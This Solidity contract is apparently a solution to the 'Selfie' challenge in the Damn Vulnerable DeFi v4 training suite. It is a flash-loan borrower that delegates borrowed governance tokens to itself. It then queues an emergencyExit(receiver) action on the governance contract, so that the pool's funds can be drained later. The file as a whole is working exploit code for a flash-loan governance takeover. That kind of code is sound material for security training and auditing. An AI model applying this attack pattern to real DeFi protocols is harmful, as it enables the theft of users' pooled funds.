// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;
import {IERC3156FlashBorrower} from "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
import {ISimpleGovernance} from "../selfie/ISimpleGovernance.sol";
import {IERC20} from "@openzeppelin/contracts/interfaces/IERC20.sol";
import "forge-std/console.sol";
import {DamnValuableVotes} from "../DamnValuableVotes.sol";
contract IERC3156FlashBorrowerImpl is IERC3156FlashBorrower {

    ISimpleGovernance public governance;
    address public receiver;
    

    constructor(ISimpleGovernance _governance,  address _receiver) {
        governance = _governance;
        receiver = _receiver;
    }


    function onFlashLoan(address, address token, uint256 _amount, uint256, bytes calldata)
        external
        override
        returns (bytes32)
    {

        DamnValuableVotes(token).delegate(address(this));
        // prepare calldata for the action you want queued on the governance contract
        bytes memory payload = abi.encodeWithSignature("emergencyExit(address)", receiver);
        console.log("receive balance", IERC20(token).balanceOf(address(this)));
        console.log("address of borrower", address(this));
        // invoke queueAction on the governance contract
        governance.queueAction(msg.sender, 0, payload);
        IERC20(token).approve(msg.sender, _amount);
        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }
}